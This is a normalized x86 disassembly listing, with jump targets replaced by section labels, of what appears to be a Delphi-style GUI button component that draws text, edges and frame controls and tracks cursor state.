lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_44b200
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
call sub_42c584
lea ecx [ ebp - 0x14 ]
pop edx
call sub_42c7b4
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_42ac30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41dd08
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404334
push eax
mov eax esi
call sub_404534
push eax
mov eax ebx
call sub_41e4e4
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_41d400
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404334
push eax
mov eax esi
call sub_404534
push eax
mov eax ebx
call sub_41e4e4
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_41d400
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404334
push eax
mov eax esi
call sub_404534
push eax
mov eax ebx
call sub_41e4e4
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42ad10
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_412988
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412988
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_412988
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_4129b0
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_412988
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_4129b0
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_404334
push eax
mov eax [ ebp + 0x20 ]
call sub_404534
push eax
mov eax [ ebp - 0x8 ]
call sub_41e4e4
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_412988
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_404334
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_412988
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_412988
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_412988
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_42c584
call sub_42c664
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_42b03c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_42ad10
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_42aacc
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42ac30
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_42b0ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cb3c
mov eax esi
mov edx [ r-xdata ]
call sub_403450
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_42b0d0
push ebx
mov ebx eax
mov eax ebx
call sub_44a424
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_42b11c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403450
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_42b14c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_42b9fc
sub_42b16c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_42ba88
sub_42b18c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a2f0
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_42b9bc
mov ecx esi
xor edx edx
mov eax ebx
call sub_445840
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_43df24
mov edx 0xff00000f
mov eax ebx
call sub_43df98
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_42b24c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44589c
mov eax [ esi + 0x16c ]
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_42b284
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b6ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_41e3e0
call sub_42c584
call sub_42c664
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_4129b0
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_41e4e4
mov edx eax
mov eax esi
call sub_43af4c
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41e4e4
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41e4e4
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_42c584
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_42c988
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41e4e4
push eax
call sub_42c584
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42c770
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41e4e4
push eax
call sub_42c584
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42c6d4
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_42c584
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_42c8c8
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41e4e4
push eax
call sub_42c584
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42c770
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41e4e4
push eax
call sub_42c584
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42c6d4
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_41dbec
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41dfc4
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_412988
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_43ddf8
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_4400f0
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42b03c
mov edx 0xff000014
mov eax 0xff00000f
call sub_4241ec
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_41dbc0
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41dfc4
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6b5
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_412988
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d400
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_43ddf8
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_4400f0
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42b03c
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_42b6bc
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43c6a4
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_43efc4
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_43efc4
jmp r-xdata
sub_42b720
push ebx
mov ebx eax
mov eax ebx
call sub_43fecc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_42a4f4
pop ebx
retn
sub_42b74c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_43f3d8
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b7a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43f690
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_42b6bc
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_43d7fc
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_43d840
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_42b844
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43f738
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_43d7fc
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_43d840
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_42b9fc
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_42b6bc
mov eax ebx
mov si 0xffeb
call sub_40349c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_42b990
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_42a4cc
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b9c4
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_441348
sub_42b9fc
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_42b9c4
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_42baf4
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42bb64
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_42a4f4
mov eax ebx
call sub_42b6bc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_42bb98
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44a6b8
sub_42bc08
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42bc91
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43ddf8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4551d4
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_40349c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bc98
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_42bcd4
push ebx
push esi
mov esi eax
mov eax esi
call sub_43fb3c
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_42c584
call sub_42c664
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
